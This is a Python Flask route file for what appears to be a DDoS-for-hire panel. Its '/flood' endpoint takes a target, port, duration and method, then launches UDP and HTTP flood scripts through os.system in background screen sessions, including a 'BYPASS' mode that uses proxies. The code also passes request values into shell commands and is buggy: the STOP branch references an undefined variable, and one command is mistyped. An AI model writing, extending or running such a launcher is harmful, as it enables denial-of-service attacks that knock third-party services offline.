import os
import datetime
from flask import Blueprint, Flask, request, jsonify, make_response
from urllib.parse import urlparse
from funcs.string import str_equals, is_str_empty, sanitize
from funcs.validator import Validation
from routes.decorators import RouteDecorators

Flood = Blueprint("Flood", __name__)

@Flood.route("/flood", methods=["GET"])
@RouteDecorators.log
@RouteDecorators.discord_webbhook_log
@RouteDecorators.admin_key_required
def flood():
    app = Flask(__name__)

    if 'target' not in request.args or 'port' not in request.args or 'time' not in request.args or 'method' not in request.args:
        return jsonify({
            "response_code": 101,
            "response_message": "Missing argument(s)."
        }), 400

    target = sanitize(request.args.get('target', default=None, type=str))
    port = sanitize(request.args.get('port', default=None, type=str))
    time = sanitize(request.args.get('time', default=None, type=str))
    method = sanitize(request.args.get('method', default=None, type=str))

    if not all([target, port, time, method]):
        return jsonify({
            "response_code": 102,
            "response_message": "Missing argument(s). Null values."
        }), 400

    if Validation.ip_list_blacklist(target):
        return jsonify({
                "response_code": 102,
                "response_message": "Target is blacklisted by ip address."
            }), 403

    if not Validation.validate_ip(target) and not Validation.validate_url(target):
        return jsonify({
            "response_code": 102,
            "response_message": "Target is not an Ipv4 or an URL."
        }), 400

    if not Validation.validate_port(port):
        return jsonify({
            "response_code": 102,
            "response_message": "Port should be in the range of (1-65535)."
        }), 400

    if not Validation.validate_time(time):
        return jsonify({
            "response_code": 102,
            "response_message": "Time should be MIN=10, MAX=14400."
        }), 400

    if method == "STOP":
        os.system(f"screen -S {screen_name} -X quit")

        return jsonify({
            "response_code": 105,
            "response_message": f"Stopped flood on {screen_name}."
        }), 200

    else:
        screen_name = target if Validation.validate_ip(target) else urlparse(target).netloc

        screen_cmd = f"screen -dm -S {screen_name} timeout {time}"

        if method == "BYPASS":
            cmd = f"rm -f proxy.txt && python3 main.py && {screen_cmd} node wabas.js {target} {time} 60 2 proxy.txt"
        elif method == "ZEUS":
            cmd = f"rm -f proxy.txt && python3 main.py && {screen_cmd} node flood.js {target} {time} 60 3"
        elif method == "UDP":
            cmd = f"rm -f proxy.txt && python3 main.py && {screen_cmd} perl private.pl {target} {port} 5000 {time}"
        elif method == "HTTP-MIX":
            cmd = f"cd /root/l7/mix && {screen_cmd} node http-mix.js {target} {time} 15"
        elif method == "HTTP-QUERY":
            cmd = f"cd /root/l7/query && {screen_cmd} nodehttp-query.js {target} {time} 15"

        os.system(cmd)

        return jsonify({
            "response_code": 105,
            "response_message": "Flood started.",
            "time": datetime.datetime.now()
        }), 200
